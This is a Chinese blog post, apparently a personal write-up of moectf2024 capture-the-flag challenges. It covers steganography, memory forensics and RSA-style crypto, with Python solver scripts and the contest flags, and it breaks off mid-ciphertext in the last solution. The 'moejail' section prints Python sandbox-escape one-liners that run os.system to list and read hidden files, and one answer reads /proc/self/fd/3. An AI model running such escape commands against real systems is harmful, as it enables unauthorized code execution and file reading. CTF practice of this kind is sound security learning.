<!doctype html><html lang=zh-cn dir=auto data-theme=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>moectf2024 | 0raN9e's Blog</title><meta name=keywords content="ctf"><meta name=description content="个人排名第25，后期就没怎么打了，复盘整理一下。
0基础入门
看完pdf，在群里输入识别码，获得flag

安全杂项
signin
登入网址，按照要求，给luo选择缺勤，其他签到
注意：完成所有要求再提交"><meta name=author content><link rel=canonical href=http://localhost:1313/posts/ctf/moectf2024/><link crossorigin=anonymous href=/assets/css/stylesheet.e145e1800263554e97061ed241e405d710b6a0b880a196a0d6ba58b49d3b9010.css integrity="sha256-4UXhgAJjVU6XBh7SQeQF1xC2oLiAoZag1rpYtJ07kBA=" rel="preload stylesheet" as=style><link rel=icon href=http://localhost:1313/favicon.ico><link rel=icon type=image/png sizes=16x16 href=http://localhost:1313/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=http://localhost:1313/favicon-32x32.png><link rel=apple-touch-icon href=http://localhost:1313/apple-touch-icon.png><link rel=mask-icon href=http://localhost:1313/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh-cn href=http://localhost:1313/posts/ctf/moectf2024/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51);color-scheme:dark}.list{background:var(--theme)}.toc{background:var(--entry)}}@media(prefers-color-scheme:light){.list::-webkit-scrollbar-thumb{border-color:var(--code-bg)}}</style></noscript><script>localStorage.getItem("pref-theme")==="dark"?document.querySelector("html").dataset.theme="dark":localStorage.getItem("pref-theme")==="light"?document.querySelector("html").dataset.theme="light":window.matchMedia("(prefers-color-scheme: dark)").matches?document.querySelector("html").dataset.theme="dark":document.querySelector("html").dataset.theme="light"</script><meta property="og:url" content="http://localhost:1313/posts/ctf/moectf2024/"><meta property="og:site_name" content="0raN9e's Blog"><meta property="og:title" content="moectf2024"><meta property="og:description" content="个人排名第25，后期就没怎么打了，复盘整理一下。
0基础入门 看完pdf，在群里输入识别码，获得flag
安全杂项 signin 登入网址，按照要求，给luo选择缺勤，其他签到
注意：完成所有要求再提交"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-12T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-12T00:00:00+00:00"><meta property="article:tag" content="Ctf"><meta name=twitter:card content="summary"><meta name=twitter:title content="moectf2024"><meta name=twitter:description content="个人排名第25，后期就没怎么打了，复盘整理一下。
0基础入门
看完pdf，在群里输入识别码，获得flag

安全杂项
signin
登入网址，按照要求，给luo选择缺勤，其他签到
注意：完成所有要求再提交"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://localhost:1313/posts/"},{"@type":"ListItem","position":2,"name":"文章","item":"http://localhost:1313/posts/ctf/"},{"@type":"ListItem","position":3,"name":"moectf2024","item":"http://localhost:1313/posts/ctf/moectf2024/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"moectf2024","name":"moectf2024","description":"个人排名第25，后期就没怎么打了，复盘整理一下。\n0基础入门 看完pdf，在群里输入识别码，获得flag\n安全杂项 signin 登入网址，按照要求，给luo选择缺勤，其他签到\n注意：完成所有要求再提交\n","keywords":["ctf"],"articleBody":"个人排名第25，后期就没怎么打了，复盘整理一下。\n0基础入门 看完pdf，在群里输入识别码，获得flag\n安全杂项 signin 登入网址，按照要求，给luo选择缺勤，其他签到\n注意：完成所有要求再提交\n罗小黑战记 打开发现是GIF，帧数藏图片，用工具提取内容\n最后扫码得到 moectf{y0uu6r3th3m0st3r1nth1sf13ld}\n杂项入门指北 得到海豹图片，尝试多种未果，注意到图片观察。其实有一段莫斯密码\n.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- . moectf{H4VE_A_G00D_T1ME}\nez_F5 头一次见这种隐写\n先看到属性里面有编码，base32解密得到no_password,010打开进行分析，在里面看到提示\n网上搜索一下是F5隐写，下载工具，上面的是密码得到flag\nmoectf{F5_15_s0_lntere5t1n9}\nso many ’m' 字频统计的题目，写一个脚本出\nfrom collections import Counter def char_frequency_sort(text): # 统计每个字符的频率 frequency = Counter(text) # 按照频率从高到低排序，如果频率相同则按字典序排序 sorted_chars = sorted(frequency.items(), key=lambda x: (-x[1], x[0])) # 拼接成排序后的字符序列 result = ''.join(char for char, count in sorted_chars) return result # 测试输入 text = \"a!{ivlotzkEm{CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC}sii}tkb}ugCD{zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC}eot#dcf{ec@ccgqpfqMycysMuuou!en#{g0cDmoyxTCMgt{joT{jnl0rhoklCe{n0CnxprydeaTg0r{avkEjckjEsxhaohs{Trbkr!ffqip444uwrc}nnevgtCT{jCipogtipzdeDiqsy44rMfj{MzCw#qwg{T4m{cuk!hwuncxdmddeurtsojakrjC#vTDd}0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq}kcf#Mpcam{mml4i4mpDnedamcwtC0nem{mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu{poeTEhD!u0anvTTTbbi{q}zapcksMifDlovoeac@{0keh0dg{Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE}eoD{xcMnoCuebu0otdusiDknfvo0{fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a}0ixeEktws}pMCfCigaTafg}ffssmwwuTkTuls0{M@c4e@{D{tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo{et4kcCpcgcT}vD}m!g4{E0!Mol0fpo!{srT0pf{cMuCx0bp{ftTmExcrn}0etonez!@C4tfa4aM00siztb@fomfD#{#tMbo@jgb4CM0dEk0tea4aMCafn\" # 获取结果并输出 result = char_frequency_sort(text) print(result) 捂住一只耳 wav音频，先用audi代开，没发现波纹图的问题，大约在1min的时候会有数字读写，看了hint才猜出，按键盘上字母对应的列行，如63就是字母第六列第三行，即n\n63 31 43 31 41 52 31 51 71 101 最后的flag为moectf{nevergetup}\nAbnormal lag 这里用adu打开发现多频图里面有内容，需要进行观察得到flag，友情提醒的是字符只有a-f和数字\n尝试后得到moectf{09e3f7f8-c970-4c71-92b0-6f03a677421a}\nmoejail_lv1 __import__('os').system('ls -al /tmp') 读取文件\n__import__('os').system('cat /tmp/.therealflag_*') 得到flag\nmoejail_lv2 用1一样的第一条先查看一下\n__import__('os').system('ls -al /tmp') 发现root权限可以看\nprint(open('/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918').read()) moejail_lv3 试了一下lv3,用2的代码可以打通，就不多赘述了\nThe upside and down 010发现是逆转，写个脚本\n# # 以二进制模式读取文件内容 with open('C:/Users/30226/Desktop/a.txt', 'rb') as f: content = f.read() # 反转文件内容 reversed_content = content[::-1] with open('C:/Users/30226/Desktop/new.txt', 'wb') as new_file: new_file.write(reversed_content) with open('new.txt', 'r') as file: lines = file.readlines() lines = [line for line in lines if line.strip()] # 将过滤后的内容写回文件 with open('new.txt', 'w') as file: file.writelines(lines) 扫一下得到flag\nhttps://balabala_towards:moectf{Fri3nds_d0n't_lie!}//\nthe_secret_of_snowball 010打开开头改为FFD8，\n得到第一段\n第二段在010底部base64解密拼接得到flag\n解不完的压缩包 先写脚本得到最后一层压缩包\nimport os import zipfile def extract_zip_file(zip_name, output_dir): with zipfile.ZipFile(zip_name, 'r') as zipf: zipf.extractall(output_dir) def main(): output_dir = \".\" # 使用当前目录进行解压 prev_extracted_file = None for i in range(999, 0, -1): zip_name = f\"{i}.zip\" if not os.path.exists(zip_name): print(f\"Error: The file '{zip_name}' does not exist.\") return # Extract the current zip file extract_zip_file(zip_name, output_dir) if prev_extracted_file: # Delete the previously extracted zip file os.remove(prev_extracted_file) prev_extracted_file = zip_name print(\"All zip files have been extracted and processed.\") if __name__ == \"__main__\": main() 根据压缩包名称的提示，crc碰撞\n利用Zipcrack.py进行爆破\n得到key m:#P7j0\t最后解密得到flag\nmoectf{af9c688e-e0b9-4900-879c-672b44c550ea}\n每人至少300份 一直在想脚本没看图片，然后利用word文档就行了简单的拼接，扫码得到一串字符,分析一会后发现了是base58加密得到了flag这题之后会有修复题\nbalabalballablblablbalablbalballbase58lblblblblllblblblblbalblbdjshjshduieyrfdrpieuufghdjhgfjhdsgfsjhdgfhjdsghjgfdshjgfhjdgfhgdh///key{3FgQG9ZFteHzw7W42}??\nkey里面的内容进行解密得到flag.\nreadme /proc/self/fd/3\nFind It orz这题历时写了很长时间，总结就是其实和图片没什么关系，直接看hint\n做题流程：豆包搜索西安带\"的\"的幼儿园，跳出了吉的堡幼儿园，简单的百度地图搜一下几个位置，发现有个小区有两个吉的堡幼儿园，最后拼写的就是moectf{ji_di_bao_you_er_yuan}\nez_Forensics 取证这一块我没这么了解过\n按流程正常输入一些内容就行(毕竟这个比较简单)\n拖入虚拟机使用vol\n常见的先看看什么镜像\nvol.py -f ../flag.raw imageinfo\n得到镜像折后可以看一下进程\nvol.py -f ../flag.raw --profile=Win7SP1x64 pslist\n可以注意到cmd.exe，根据题目的提示，我们需要得到cmd里面的flag\n进行cmdscan扫描\nvol.py -f ../flag.raw --profile=Win7SP1x64 cmdscan\n得到了flag\nCommandProcess: conhost.exe Pid: 2268 CommandHistory: 0x32b0a0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 3 LastAdded: 2 LastDisplayed: 2 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 @ 0x330410: echo moectf{WWBGY-TLVC5-XKYBZ} \u003e flag.txt Cmd #1 @ 0x30cec0: echo SJW7O^%gt8 \u003e flag.txt Cmd #2 @ 0x3350b0: del flag.txt ************************************************** ctfer2077① 先扫看看发现没有东西，用steg看一下，发现有一处有一串内容，data分析一下得到flag\nmoectf{84d7f247-3cba-4077-ba25-079f3ac7bb8a}\nctfer2077② 加密卷用veracrpt进行解密，然后使用DiskGenius进行恢复文件得到一段内容，打开发现没有明显的内容，估计是被删了，去修复一下。有一个小鹤.txt的文件，内容是\nulpb vfde hfyz yisi buuima key jqui xxmm vedrhx de qrpb xnxp ulpb ui veyh dazide 经过分析是双拼打的字，进行简单分析得到key\nshuangpinshizheyangdazide\n加个moectf就是flag\nctfer2077③ 流量包导出内容，然后upload文件利用foremost解开得到压缩包，解压得到一些文件。\n有个gif动图隐约能看见有字提取一下内容，得到key:C5EZFsC6\n正常用aud打开发现没什么内容，注意是MP3文件，尝试用MP3stego解密\n得到了文件，是brainfuck转text的内容，得到了字符串H5gHWM9b\n解开压缩包是3个txt文件，缩小观察是福尔摩斯小人，上图片\n挨个对应然后输入就是以下字符串，最后套个moectf{}\npeople_dancing_happily\n现代密码学 现代密码学入门指北 根据文本写脚本\nfrom Crypto.Util.number import long_to_bytes, inverse # 给定的参数 p = 197380555956482914197022424175976066223 q = 205695522197318297682903544013139543071 n = 40600296529065757616876034307502386207424439675894291036278463517602256790833 e = 65537 c = 36450632910287169149899281952743051320560762944710752155402435752196566406306 # 计算 φ(n) phi = (p - 1) * (q - 1) # 计算解密指数 d d = inverse(e, phi) # 解密密文 c 得到明文 m m = pow(c, d, n) # 将明文 m 转换为字节 flag = long_to_bytes(m) # 输出解密的结果 print(flag.decode()) Signin from Crypto.Util.number import inverse, long_to_bytes, GCD from sympy import symbols, solve # 先定义已知的变量 c = 5654386228732582062836480859915557858019553457231956237167652323191768422394980061906028416785155458721240012614551996577092521454960121688179565370052222983096211611352630963027300416387011219744891121506834201808533675072141450111382372702075488292867077512403293072053681315714857246273046785264966933854754543533442866929316042885151966997466549713023923528666038905359773392516627983694351534177829247262148749867874156066768643169675380054673701641774814655290118723774060082161615682005335103074445205806731112430609256580951996554318845128022415956933291151825345962528562570998777860222407032989708801549746 pq = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687154230787854196153067547938936776488741864214499155892870610823979739278296501074632962069426593691194105670021035337609896886690049677222778251559566664735419100459953672218523709852732976706321086266274840999100037702428847290063111455101343033924136386513077951516363739936487970952511422443500922412450462 qp = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687077087914198877794354459669808240133383828356379423767736753506794441545506312066344576298453957064590180141648690226266236642320508613544047037110363523129966437840660693885863331837516125853621802358973786440314619135781324447765480391038912783714312479080029167695447650048419230865326299964671353746764860 n = 18047017539289114275195019384090026530425758236625347121394903879980914618669633902668100353788910470141976640337675700570573127020693081175961988571621759711122062452192526924744760561788625702044632350319245961013430665853071569777307047934247268954386678746085438134169871118814865536503043639618655569687534959910892789661065614807265825078942931717855566686073463382398417205648946713373617006449901977718981043020664616841303517708207413215548110294271101267236070252015782044263961319221848136717220979435486850254298686692230935985442120369913666939804135884857831857184001072678312992442792825575636200505903 p_q = 279533706577501791569740668595544511920056954944184570513187478007551195831693428589898548339751066551225424790534556602157835468618845221423643972870671556362200734472399328046960316064864571163851111207448753697980178391430044714097464866523838747053135392202848167518870720149808055682621080992998747265496 e = 65537 # 恢复 p 和 q x = symbols('x') equation = x**2 - p_q*x + n solutions = solve(equation, x) p = int(solutions[0]) q = int(solutions[1]) # 计算 φ(n) phi_n = (p - 1) * (q - 1) # 计算私钥 d d = inverse(e, phi_n) # 解密消息 m = pow(c, d, n) flag = long_to_bytes(m) print(f\"Recovered flag: {flag.decode()}\") Big and small from Crypto.Util.number import long_to_bytes import gmpy2 # 给定的c, e, n c = 150409620528288093947185249913242033500530715593845912018225648212915478065982806112747164334970339684262757 e = 3 n = 20279309983698966932589436610174513524888616098014944133902125993694471293062261713076591251054086174169670848598415548609375570643330808663804049384020949389856831520202461767497906977295453545771698220639545101966866003886108320987081153619862170206953817850993602202650467676163476075276351519648193219850062278314841385459627485588891326899019745457679891867632849975694274064320723175687748633644074614068978098629566677125696150343248924059801632081514235975357906763251498042129457546586971828204136347260818828746304688911632041538714834683709493303900837361850396599138626509382069186433843547745480160634787 # 使用 gmpy2 提供的立方根计算函数 m, exact = gmpy2.iroot(c, e) # 如果立方根是精确的，我们可以直接获取明文 if exact: flag = long_to_bytes(m) print(flag) else: print(\"密文可能无法直接解密，或者立方根不精确。\") ez_hash 给的提示其实因为是qq号所以都是数字，直接爆破就好\nfrom hashlib import sha256 # 给定的哈希值 target_hash = '3a5137149f705e4da1bf6742e62c018e3f7a1784ceebcb0030656a2b42f50b6a' # 已知的秘密开头 prefix = b'2100' # 暴力破解可能的秘密 for i in range(1000000): # 从 000000 到 999999 # 格式化为 6 位数字，不足的前面补零 suffix = f'{i:06}'.encode() secrets = prefix + suffix # 计算 SHA-256 哈希值 hash_value = sha256(secrets).hexdigest() # 检查哈希值是否匹配 if hash_value == target_hash: print(f\"Found secrets: {secrets.decode()}\") break baby_equation 首先对这个进行化简 $$ ((a^2 + 1)(b^2 + 1) - 2(a - b)(ab - 1)) == 4*(k + a*b) $$\n$$ (a+1)^2(b-1)^2=4k $$\n然后还有求a,b\nimport gmpy2 from Crypto.Util.number import long_to_bytes def find(tot, index, ls): \"\"\" 递归查找函数，用于寻找合适的因子组合，使得通过这些因子构造出的数字能够还原出 flag。 :param tot: 当前的乘积值（初始值为1）。 :param index: 当前处理的因子索引。 :param ls: 因子列表，包含所有可能的因子。 :return: 满足条件的乘积值，如果未找到则返回0。 \"\"\" # 基准情况：如果已经检查了所有因子 if index == len(ls): # 检查当前的 tot 是否可能包含 flag 的特征字符串（例如 'moectf{'） if b'moectf{' in long_to_bytes(tot): return tot # 返回找到的值 return 0 # 没找到返回 0 # 递归查找，尝试包含当前因子的情况 a = find(tot * ls[index], index + 1, ls) # 递归查找，尝试不包含当前因子的情况 b = find(tot, index + 1, ls) # 返回找到的非零结果 return a if a != 0 else b # 给定的常量 k 值 k = 0x2227e398fc6ffcf5159863a345df85ba50d6845f8c06747769fee78f598e7cb1bcf875fb9e5a69ddd39da950f21cb49581c3487c29b7c61da0f584c32ea21ce1edda7f09a6e4c3ae3b4c8c12002bb2dfd0951037d3773a216e209900e51c7d78a0066aa9a387b068acbd4fb3168e915f306ba40 # 计算 a1b1 = sqrt(4 * k) a1b1 = gmpy2.iroot(4 * k, 2)[0] # 因子列表，包含可能分解出的因子组合 fac = [ 2, 2, 2, 2, 3, 3, 31, 61, 223, 4013, 281317, 4151351, 339386329, 370523737, 5404604441993, 26798471753993, 25866088332911027256931479223, 64889106213996537255229963986303510188999911 ] # 使用递归查找因子组合，得到 a1 a1 = find(1, 0, fac) # 计算 b1 = a1b1 // a1 b1 = a1b1 // a1 # 使用 long_to_bytes 将 a1 和 b1 转换为字节并输出 flag print(long_to_bytes(a1 - 1) + long_to_bytes(b1 + 1)) new_system import gmpy2 from Crypto.Util.number import long_to_bytes # 给定的值 a1, c1 = [48152794364522745851371693618734308982941622286593286738834529420565211572487, 21052760152946883017126800753094180159601684210961525956716021776156447417961] a2, c2 = [48649737427609115586886970515713274413023152700099032993736004585718157300141, 6060718815088072976566240336428486321776540407635735983986746493811330309844] a, c = [30099883325957937700435284907440664781247503171217717818782838808179889651361, 85333708281128255260940125642017184300901184334842582132090488518099650581761] q = 105482865285555225519947662900872028851795846950902311343782163147659668129411 b = (c - c1 - c2) % q d = (a - a1 - a2) % q assert b \u003e 0 assert d \u003e 0 assert gmpy2.gcd(d, q) == 1 inv_d = gmpy2.invert(d, q) x = (b * inv_d) % q print(f\"The value of x is: {x}\") gift = (c - a * x) % q print(long_to_bytes(gift)) RSA_revenge from Crypto.Util.number import long_to_bytes import gmpy2 # 给定的数值 n = 141326884939079067429645084585831428717383389026212274986490638181168709713585245213459139281395768330637635670530286514361666351728405851224861268366256203851725349214834643460959210675733248662738509224865058748116797242931605149244469367508052164539306170883496415576116236739853057847265650027628600443901 c = 47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597 e = 65537 # 初始的 Brute Force 用于寻找 p 和 q def brute_force(a, b, k): if k == 256: if a * b == n: print(f'找到因子: a={a}, b={b}') return a, b return 0 for i in range(2): for j in range(2): a1 = a + i * (2 ** (511 - k)) + j * (2 ** k) b1 = b + j * (2 ** (511 - k)) + i * (2 ** k) if a1 * b1 \u003e n: continue if (a1 + 2 ** (511 - k)) * ((b1 + 2 ** (511 - k))) \u003c n: continue if (a1 * b1) % (2 ** (k + 1)) != n % (2 ** (k + 1)): continue result = brute_force(a1, b1, k + 1) if result: return result return 0 # 调用 Brute Force 函数来找到 p 和 q p, q = brute_force(0, 0, 0) # RSA 解密函数 def decrypt_rsa(p, q, c, e): # 计算模数 n 和 Euler's totient (phi) n = p * q phi = (p - 1) * (q - 1) # 计算私钥 d d = gmpy2.invert(e, phi) # 使用私钥解密密文 m = pow(c, d, n) return long_to_bytes(m) # 解密并打印结果 plaintext = decrypt_rsa(p, q, c, e) print(f'解密后的明文: {plaintext.decode()}') ezlegendre 对于密文中的每个数字 n，我们计算 (n-a | p) 的勒让德符号。\n如果勒让德符号为 1，则对应的原始比特为 1；否则为 0。\n我们将所有解密出的比特拼接成一个二进制字符串。\n最后，我们将二进制字符串每8位转换为一个ASCII字符，得到最终的明文\nfrom sympy import legendre_symbol def decrypt_flag(ciphertext, p, a): plaintext = \"\" for n in ciphertext: # 计算勒让德符号 (n|p) 和 (a|p) leg_n = legendre_symbol(n, p) leg_a = legendre_symbol(a, p) # 如果 (n|p) == (a|p)，则原始比特为 0，否则为 1 bit = '0' if leg_n == leg_a else '1' plaintext += bit # 将二进制字符串转换为ASCII字符 flag = '' for i in range(0, len(plaintext), 8): byte = plaintext[i:i + 8] flag += chr(int(byte, 2)) return flag # 给定的参数 p = 303597842163255391032954159827039706827 a = 34032839867482535877794289018590990371 # 从给定的输出中提取密文 ciphertext = [278121435714344315140568219459348432240, 122382422611852957172920716982592319058, 191849618185577692976529819600455462899, 94093446512724714011050732403953711672, 201558180013426239467911190374373975458, 68492033218601874497788216187574770779, 126947642955989000352009944664122898350, 219437945679126072290321638679586528971, 10408701004947909240690738287845627083, 219535988722666848383982192122753961, 173567637131203826362373646044183699942, 80338874032631996985988465309690317981, 61648326003245372053550369002454592176, 277054378705807456129952597025123788853, 17470857904503332214835106820566514388, 107319431827283329450772973114594535432, 238441423134995169136195506348909981918, 99883768658373018345315220015462465736, 188411315575174906660227928060309276647, 295943321241733900048293164549062087749, 262338278682686249081320491433984960912, 22801563060010960126532333242621361398, 36078000835066266368898887303720772866, 247425961449456125528957438120145449797, 843438089399946244829648514213686381, 134335534828960937622820717215822744145, 74167533116771086420478022805099354924, 249545124784428362766858349552876226287, 37282715721530125580150140869828301122, 196898478251078084893324399909636605522, 238696815190757698227115893728186526132, 299823696269712032566096751491934189084, 36767842703053676220422513310147909442, 281632109692842887259013724387076511623, 205224361514529735350420756653899454354, 129596988754151892987950536398173236050, 97446545236373291551224026108880226180, 14756086145599449889630210375543256004, 286168982698537894139229515711563677530, 100213185917356165383902831965625948491, 268158998117979449824644211372962370753, 264445941122079798432485452672458533870, 87798213581165493463875527911737074678, 131092115794704283915645135973964447801, 164706020771920540681638256590936188046, 178911145710348095185845690896985420147, 154776411353263771717768237918437437524, 260700611701259748940616668959555019434, 222035631087536380654643071679210307962, 281292430628313502184158157303993732703, 24585161817233257375093541076165757776, 269816384363209013058085915818661743171, 39975571110634682056180877801094873602, 125235869385356820424712474803526156473, 218090799597950517977618266111343968738, 144927096680470512196610409630841999788, 213811208492716237073777701143156745108, 64650890972496600196147221913475681291, 302694535366090904732833802133573214043, 214939649183312746702067838266793720455, 219122905927283854730628133811860801459, 224882607595640234803004206355378578645, 260797062521664439666117613111279885285, 279805661574982797810336125346375782066, 147173814739967617543091047462951522968, 23908277835281045050455945166237585493, 186338363482466926309454195056482648936, 295140548360506354817984847059061185817, 151948366859968493761034274719548683660, 96829048650546562162402357888582895187, 61129603762762161772506800496463804206, 83474322431616849774020088719454672415, 25094865151197136947956010155927090038, 86284568910378075382309315924388555908, 269311313874077441782483719283243368999, 293865655623484061732669067594899514872, 42618744258317592068586041005421369378, 54330626035773013687614797098120791595, 147903584483139198945881545544727290390, 290219451327796902155034830296135328101, 147951591390019765447087623264411247959, 176721307425594106045985172455880551666, 10617017342351249793850566048327751981, 166002147246002788729535202156354835048, 43653265786517886972591512103899543742, 191250321143079662898769478274249620839, 142288830015965036385306900781029447609, 231943053864301712428957240550789860578, 259705854206260213018172677443232515015, 42547692646223561211915772930251024103, 210863755365631055277867177762462471179, 140297326776889591830655052829600610449, 136970598261461830690726521708413303997, 93221970399798040564077738881047391445, 192314170920206027886439562261321846026, 95904582457122325051140875987053990027, 158334009503860664724416914265160737388, 134039922705083767606698907224295596883, 7789601161004867293103537392246577269, 261069289329878459425835380641261840913, 123743427894205417735664872035238090896, 20126583572929979071576315733108811761, 5317214299018099740195727361345674110, 68965882674411789667953455991785095270, 235934145208367401015357242228361016868, 250709310980093244562698210062174570956, 167048130489822745377277729681835553856, 122439593796334321806299678109589886368, 117953800124952553873241816859976377866, 226311466875372429157352019491582796620, 301401080214561977683439914412806833619, 255816105091394723475431389696875064495, 73243049441397892506665249226961409560, 226985189100195407227032930008331832009, 164462051705780513134747720427967016844, 97905180778488273557095248936896399883, 40737879120410802220891174679005117779, 180413920169781019749877067396006212488, 171309368917976988181007951396904157090, 215065878665354148046787050342635722874, 54225964222741166664978354789209176721, 179980445108969868669560591527220171967, 39118880593034932654127449293138635964, 170210538859699997092506207353260760212, 62152643864232748107111075535730424573, 28285579676042878568229909932560645217, 69823876778445954036922428013285910904, 170371231064701443428318684885998283021, 211884923965526285445904695039560930451, 2912793651373467597058997684762696593, 220544861190999177045275484705781090327, 142755270297166955179253470066788794096, 264271123927382232040584192781810655563, 214901195876112453126242978678182365781, 252916600207311996808457367909175218824, 176399700725319294248909617737135018444, 230677646264271256129104604724615560658, 1568101696521094800575010545520002520, 276644650735844694794889591823343917140, 185355461344975191330786362319126511681, 248497269558037476989199286642120676823, 27426372552503547932146407600438894266, 99885839446999373024614710052031031159, 238693364649026611386487480573211208980, 27047849084544903200283111147329657123, 261687609401872239323715016608713989139, 34926503987070847956303036393611830590, 252495954285655595492775877967398282722, 249358827602419141539353237669905281246, 42551212101869966935955269842854722856, 286527336123436427709115043975536071462, 158097411156207320921055042509886995091, 40982984899524424348979403377331335675, 87268254405858939730919659372073314983, 142920872841164853694746048293715385493, 280344634952903421792629929689092857993, 203584314487374069738101729666435007339, 76747904284507590577908045394001414841, 18608573158088521401404614102481693137, 104158289118605398449367221892619783009, 182616719368573751169836443225324741716, 272025723760783252166092979911587562064, 24194069309604403496494752448487752613, 71973842397785917741048132725314885345, 281558046604363121112749722271741416764, 66965324704079734796576428718112513855, 105222756356650324548621319241035836840, 331654051401420900830576011369146182, 131087815164777263900650262777429797113, 76104729920151139813274463849368737612, 163253554841934325278065946152769269296, 35973933431510942249046321254376084104, 223355354158871484030430212060934655984, 181704973473887713398031933516341967465, 131391458395622565487686089688656869743, 153029062510158353978320224242258979076, 75598349867958834632866616947240059419, 107656133091853571710502064573530657194, 261653899003034450454605322537555204702, 102387069931966536076616272953425585051, 174654548539988861301269811985320013260, 30731762585661721683653192240732246059, 265493340795853624586170054917042208660, 174818040730242275465453007894471517233, 99514915046145707535310601810631334278, 133978892607644700903700803642408771370, 216019770199630171637325931783378096100, 76687884966028369399497157007109898467, 262185741950606001987209986574269562289, 101935410844521914696784339882721918198, 85956270718878931834010975962772401589, 117578315837774870077915813512746446219, 209811226703488479967593762805568394383, 85782228978690599612110880989543246041, 234993402267259336147096170367513324439, 158487299348452041021565296682698871789, 159701431055714867184644360639841355076, 109022557288733938098734847159477770521, 20764822884655633017647117775843651332, 144987524936939260617020678038224835887, 214906746504968333094519539609226540495, 61852186870193663367998110214331582115, 90175894032076080713807606548780168998, 283504071501037047650569090140982777586, 267695305479884628857258564337611106120, 2466175482923380874813569827625743835, 62561740902965346823256447383892272796, 181458673990444296212252831090106274182, 151903421483215372136947284355251617709, 19545903652854510304023406921387221130, 219205004027218279279153442572018305650, 62495663621315535552427938857863551873, 12365469869484359722316573851483855865, 84444120685499458796249283893323932282, 240719245204462516267560756675192129462, 27868242791206675092288978266113368469, 231956104988320170956546781095814860314, 238410591787987745803829175586952288627, 290649141309468101840354611586699479851, 288298044918505512172272603794059992911, 43375655853069820305921366762777897508, 195308577786654489057887409352840304641, 184459971400898842809886506207633536394, 255884612697066296714973816950917234211, 8695922085804648269560669225439485137, 109407350389195091443836128149623969417, 40151058765649465408124869078260007620, 125484946058191366826510549493690011718, 71132588066103752922321942940739808864, 74434669478187680319595294456652807097, 187368213679294937718535073296853726111, 63461505676143678393259420949793811831, 131619805472714703711458729455838994067, 8579657158619864010437706463902003097, 60626278761876782233388469543817973673, 44776499706241603722632560896220653186, 257249861781237389988455384617803171877, 161899873165011719282095749671993720527, 73303482092538159761390536102771615311, 141674253732456103774983358188317473860, 112299149158347774069079224861237069975, 192409969047313867540459549167233638120, 52560717143548208264188844553309600513, 209294007943747095607573416682772182613, 65285862009539442533024037477398617382, 141465096635701758351979378177631042196, 282970656853503001128091562858564344839, 50475483578642585644452991078499278745, 162546597698227455939743094437394415689, 65258447920153625609456176138520078583, 25184730952052088803921023041299838584, 228883100940853988548836641050823478387, 234342509561041384559923481191578502671, 96929129863331626375704681481278825323, 288533470498072097357398960101692503873, 202238020435442160571930572760188491021, 179010548891454398845389500871076122861, 210509821764943794358893224681677583929, 301357944197101288505771002301759006254, 188933290023352627523422420332593360537, 207946655777875200521742190622482472884, 288626263488145443150622420747070805416, 75616301779108425588545170038742534166, 58163857263381687168244101022135667109, 297006021514663344215599115965804102114, 297690420826548736122127126645053452341, 88307045391242971429880119414942510712, 186427606153958359494215188169120285788, 135488686276533521058776859854524444361, 185380054960856211260651416683468161990, 175033658667416561573078028845860911744, 223026004671602541191897755812121342354, 34657268786986063209312902409995458857, 120560332690000675303295481174067849230, 55304621833927249516093996383526467671, 111480233798478730015825495041130765708, 188996716801525995463705449722399676888, 276300230605454487705048192796463035731, 195951365841304132244984630163178946841, 97383655947416522972353051984313703380, 94486945760999630041197414137963583839, 180706938513681126017333618518691884990, 291355503207799224380050183085704824037, 69034413486375685936282884707402207337, 147750870458026934714106830614187010708, 45030500748522416863096615057804736553, 242760053973560804002707125041520857401, 78549841097746795170488790352479728712, 2356186555504071026416878904180857750, 250486437623828232647064146324392061051, 23443836455198610186212360005846025976, 174557226633145985326629017377610499133, 105578481831185315088267357915446186040, 275620780071666328887795273613981325091, 23435505408737317601794562472269448966, 153209223406380813663608757935808571040, 298537417505667302508269715871007454162, 203833907122687718347615710181705388877, 41923370405573382737900061813058979798, 3762696947926387653032627637114050038, 201362054098012734707571348865729525585, 285561801443127226417656620776228615886, 111526376057659222252771678197929357387, 203857473647840873587593099562928738804, 44500972779851392967974092230683443589, 